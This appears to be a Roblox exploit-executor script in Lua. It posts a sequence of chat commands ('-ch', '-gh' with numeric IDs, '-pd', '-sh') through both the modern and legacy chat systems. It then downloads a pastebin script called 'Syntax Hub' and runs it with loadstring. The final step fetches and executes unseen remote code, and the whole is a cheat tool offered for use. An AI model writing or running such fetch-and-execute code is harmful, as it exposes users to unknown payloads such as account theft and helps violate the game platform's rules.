-- Configuration
local chatDelay = 1.25
local messages = {
    "-ch",
    "-gh -gh 4735642922,3806345275,3850687401,451220849,48474294,62724852,62234425,29532720",
    "-pd",
    "-sh"
}

-- Function to safely send chat messages across different Roblox chat systems
local function sendChat(message)
    -- Modern TextChatService (2023+)
    local textChatService = game:GetService("TextChatService")
    if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
        if textChannel then
            textChannel:SendAsync(message)
            return
        end
    end
    
    -- Legacy ChatService fallback
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if defaultChatSystemChatEvents then
        local sayMessageRequest = defaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if sayMessageRequest and sayMessageRequest:IsA("RemoteEvent") then
            sayMessageRequest:FireServer(message, "All")
        end
    end
end

-- Main Execution Sequence
task.spawn(function()
    -- Loop through and send the configured messages with the specified delay
    for _, msg in ipairs(messages) do
        sendChat(msg)
        task.wait(chatDelay)
    end
    
    -- Execute the external Syntax Hub script after the final delay
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/g1V0kR5j"))()
    end)
    
    if not success then
        warn("Failed to execute external script: " .. tostring(err))
    end
end)